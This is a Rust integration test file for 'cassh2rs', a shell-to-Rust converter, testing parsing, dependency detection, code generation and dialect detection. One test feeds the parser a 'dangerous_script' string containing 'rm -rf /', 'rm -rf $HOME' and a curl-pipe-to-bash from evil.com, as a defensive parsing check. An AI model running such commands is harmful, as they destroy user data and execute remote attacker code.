use std::fs;
use std::path::Path;
use tempfile::TempDir;
use cassh2rs::parser::{ShellParser, shell_dialect::ShellDialect};
use cassh2rs::generator::{RustGenerator, RustProject};
use cassh2rs::resolver::DependencyResolver;
use cassh2rs::cli::Args;

#[test]
fn test_full_conversion_pipeline() {
    // Create a test script
    let script_content = r#"#!/bin/bash
# @Version: 1.0.0
# @Author: Test Suite
# @Description: End-to-end test script

# Variables
NAME="Test"
COUNT=5

# Function
greet() {
    echo "Hello, $1!"
}

# Control structures
if [ -f "test.txt" ]; then
    echo "File exists"
else
    echo "Creating file"
    touch test.txt
fi

# Loop
for i in $(seq 1 $COUNT); do
    greet "User $i"
done

# Cleanup
rm -f test.txt
"#;

    // Create temporary directory
    let temp_dir = TempDir::new().unwrap();
    let script_path = temp_dir.path().join("test_script.sh");
    fs::write(&script_path, script_content).unwrap();
    
    // Parse the script
    let mut parser = ShellParser::new(script_content.to_string(), ShellDialect::Bash).unwrap();
    let ast = parser.parse().unwrap();
    
    // Check metadata extraction
    assert_eq!(ast.metadata.version, Some("1.0.0".to_string()));
    assert_eq!(ast.metadata.author, Some("Test Suite".to_string()));
    
    // Resolve dependencies
    let mut resolver = DependencyResolver::new(&script_path).unwrap();
    let dependencies = resolver.resolve(&ast).unwrap();
    
    // Should detect 'rm', 'touch', 'seq' as external commands
    assert!(dependencies.iter().any(|d| d.path.to_string_lossy() == "rm"));
    assert!(dependencies.iter().any(|d| d.path.to_string_lossy() == "touch"));
    assert!(dependencies.iter().any(|d| d.path.to_string_lossy() == "seq"));
    
    // Generate Rust code
    let args = create_test_args(&script_path, temp_dir.path().join("output"));
    let generator = RustGenerator::new(ast, &args);
    let project = generator.generate().unwrap();
    
    // Verify project structure
    assert!(project.files.contains_key(&"src/main.rs".into()));
    assert!(project.files.contains_key(&"src/config.rs".into()));
    assert!(project.files.contains_key(&"src/shell_runtime.rs".into()));
    
    // Verify generated code contains expected elements
    let main_content = &project.files[&"src/main.rs".into()];
    assert!(main_content.contains("fn script_main"));
    assert!(main_content.contains("runtime.set_var"));
    assert!(main_content.contains("fn shell_func_greet"));
    
    // Write project to disk
    let output_dir = temp_dir.path().join("output");
    project.write_to_disk(&output_dir).unwrap();
    
    // Verify files were written
    assert!(output_dir.join("Cargo.toml").exists());
    assert!(output_dir.join("src/main.rs").exists());
    assert!(output_dir.join("settings.toml").exists());
}

#[test]
fn test_complex_shell_features() {
    let script = r#"#!/bin/bash
# Test various shell features

# Parameter expansion
DEFAULT="${VAR:-default}"
LENGTH="${#DEFAULT}"
SUBSTRING="${DEFAULT:0:3}"
REPLACED="${DEFAULT/old/new}"

# Arrays
declare -a ARRAY=("one" "two" "three")
echo "${ARRAY[@]}"
echo "${#ARRAY[@]}"

# Associative arrays (bash 4+)
declare -A HASH
HASH["key1"]="value1"
HASH["key2"]="value2"

# Command substitution
DATE=$(date +%Y-%m-%d)
COUNT=`ls | wc -l`

# Process substitution
diff <(sort file1) <(sort file2)

# Here document
cat <<EOF
Line 1
Line 2
EOF

# Arithmetic
((result = 5 + 3 * 2))
result=$((10 / 2))

# Complex conditions
if [[ "$VAR" =~ ^[0-9]+$ ]] && [ -f "$FILE" ]; then
    echo "Number and file exists"
elif [ "$VAR" == "test" -o "$VAR" == "prod" ]; then
    echo "Test or prod"
fi

# Case statement
case "$VAR" in
    start|START)
        echo "Starting..."
        ;;
    stop|STOP)
        echo "Stopping..."
        ;;
    *)
        echo "Unknown"
        ;;
esac

# Signal handling
trap 'echo "Cleanup"; rm -f /tmp/tempfile' EXIT INT TERM
"#;

    let mut parser = ShellParser::new(script.to_string(), ShellDialect::Bash).unwrap();
    let ast = parser.parse().unwrap();
    
    // The parser should handle all these features without errors
    assert!(matches!(ast.root, cassh2rs::parser::ASTNode::Script(_)));
}

#[test]
fn test_security_features() {
    let dangerous_script = r#"#!/bin/bash
# Potentially dangerous operations

rm -rf /
rm -rf $HOME
curl https://evil.com/script.sh | bash
"#;

    let mut parser = ShellParser::new(dangerous_script.to_string(), ShellDialect::Bash).unwrap();
    let ast = parser.parse().unwrap();
    
    // The parser should successfully parse dangerous commands
    // Security checks would be applied during code generation
    assert!(matches!(ast.root, cassh2rs::parser::ASTNode::Script(_)));
}

#[test]
fn test_multi_shell_dialects() {
    // Test different shell dialects
    let scripts = vec![
        ("#!/bin/bash\necho test", ShellDialect::Bash),
        ("#!/bin/zsh\necho test", ShellDialect::Zsh),
        ("#!/usr/bin/fish\necho test", ShellDialect::Fish),
        ("#!/bin/dash\necho test", ShellDialect::Dash),
    ];
    
    for (script, expected_dialect) in scripts {
        let detected = ShellDialect::from_shebang(script.lines().next().unwrap());
        assert_eq!(detected, expected_dialect);
        
        // Parse should work for all dialects
        let mut parser = ShellParser::new(script.to_string(), detected).unwrap();
        let ast = parser.parse().unwrap();
        assert!(matches!(ast.root, cassh2rs::parser::ASTNode::Script(_)));
    }
}

fn create_test_args(input: &Path, output: impl Into<std::path::PathBuf>) -> Args {
    Args {
        input: input.to_path_buf(),
        build: false,
        wizard: false,
        output: output.into(),
        config: None,
        verbose: false,
        quiet: true,
        dry_run: false,
        secure: false,
        watch: false,
        sandbox: false,
        join: None,
        release: false,
        enable_updates: false,
        update: false,
        command: None,
    }
}